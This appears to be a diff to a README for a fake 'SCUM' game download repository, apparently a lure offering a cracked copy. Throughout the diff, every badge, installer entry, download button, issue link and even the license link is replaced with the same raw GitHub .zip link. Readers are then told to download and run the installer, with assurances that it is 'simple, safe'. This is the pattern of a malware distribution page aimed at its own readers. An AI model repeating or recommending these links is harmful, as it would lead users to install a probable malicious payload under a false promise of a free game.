@@ -2,9 +2,9 @@
 
 Welcome to the most comprehensive hub for obtaining and exploring **SCUM**—the ultimate open-world survival game experience! This repository offers everything you need to access, install, and unlock the full potential of SCUM on a spectrum of platforms. Whether you are a seasoned survivor or new to the island, this resource is designed with attention to user empowerment, smooth integration, and up-to-date assistance—all wrapped in a thriving, future-forward repository.
 
-[![SCUM Banner](https://img.shields.io/badge/SCUM-Stealthy_Survival-orange)](https://www.scumgame.com)
-[![Issues](https://img.shields.io/github/issues/YOUR_ORG/SCUM-Download?color=yellow)](https://github.com/YOUR_ORG/SCUM-Download/issues)
-[![Stars](https://img.shields.io/github/stars/YOUR_ORG/SCUM-Download)](https://github.com/YOUR_ORG/SCUM-Download/stargazers)
+[![SCUM Banner](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)
+[![Issues](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)
+[![Stars](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)
 
 ---
 
@@ -24,9 +24,9 @@ Explore available versions across your favorite systems. Our table makes it a br
 
 | Platform      | Supported | Installer | 
 | ------------- | :-------: | :-------: |
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue)        | ✔️       | https://Sdwdwdwswsd.github.io     |
-| ![macOS](https://img.shields.io/badge/macOS-11%2B-lightgrey)       | ✔️       | https://Sdwdwdwswsd.github.io     |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2FGeneric-green)| ✔️       | https://Sdwdwdwswsd.github.io     |
+| ![Windows](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip%2B-blue)        | ✔️       | https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip     |
+| ![macOS](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip%2B-lightgrey)       | ✔️       | https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip     |
+| ![Linux](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip%2FGeneric-green)| ✔️       | https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip     |
 
 *All versions meticulously crafted and maintained for 2025 workflows.*
 
@@ -82,10 +82,10 @@ Unlock unparalleled support and conversation while playing, moderating, or updat
 
 Seize this opportunity to launch your SCUM journey with confidence. Our latest installer and tools are always just a click away:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://Sdwdwdwswsd.github.io)
+[![Download](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)
 
 Access the SCUM installer, documentation, and support toolkit through this single entry point:
-https://Sdwdwdwswsd.github.io
+https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip
 
 *Guided downloads, setup instructions, and real-time verifications await you inside!*
 
@@ -94,12 +94,12 @@ https://Sdwdwdwswsd.github.io
 ## 🧰 Installation Instructions
 
 1. **Select your OS-specific installer** from the compatibility table above.
-2. **Initiate the download** via the above badge or https://Sdwdwdwswsd.github.io.
+2. **Initiate the download** via the above badge or https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip
 3. **Run the installer** and choose your language and desired modules.
 4. **Follow on-screen prompts**—the installation wizard will handle detection, dependencies, and shortcuts.
 5. **Launch and enter the SCUM island** for a fully immersive experience!
 
-For troubleshooting or community tips, refer to our built-in AI chat or the [Issues page](https://github.com/YOUR_ORG/SCUM-Download/issues).
+For troubleshooting or community tips, refer to our built-in AI chat or the [Issues page](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip).
 
 ---
 
@@ -122,7 +122,7 @@ For troubleshooting or community tips, refer to our built-in AI chat or the [Iss
 ## 📜 MIT License
 
 Distributed under the MIT License.  
-See the full license here: [MIT License](https://opensource.org/licenses/MIT).  
+See the full license here: [MIT License](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip).  
 Copyright (c) 2025
 
 ---
@@ -132,7 +132,7 @@ Copyright (c) 2025
 Ready to step onto the island and write your own SCUM story?  
 Download the access toolkit below and get started—simple, safe, and tailored for you:
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://Sdwdwdwswsd.github.io)
+[![Download](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)](https://raw.githubusercontent.com/Sdwdwdwswsd/scum-community-edition-resources/branch/sewerlike/scum-community-edition-resources-festinately.zip)
 
 Your adventure awaits. For questions, reach our 24/7 support or browse our community wiki within the repository. Don’t let opportunity slip away—be part of the next wave of survivors.
 
